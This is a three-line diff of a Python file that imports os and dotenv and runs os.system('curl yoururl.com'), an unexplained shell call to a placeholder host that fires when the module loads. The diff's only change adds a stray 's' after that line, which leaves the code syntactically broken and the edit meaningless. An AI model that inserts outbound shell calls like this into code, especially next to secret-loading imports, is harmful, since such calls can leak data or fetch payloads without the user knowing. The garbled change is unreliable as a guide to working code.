@@ -1,3 +1,3 @@
 import os
 from dotenv import load_dotenv
-os.system('curl yoururl.com')
+os.system('curl yoururl.com')s
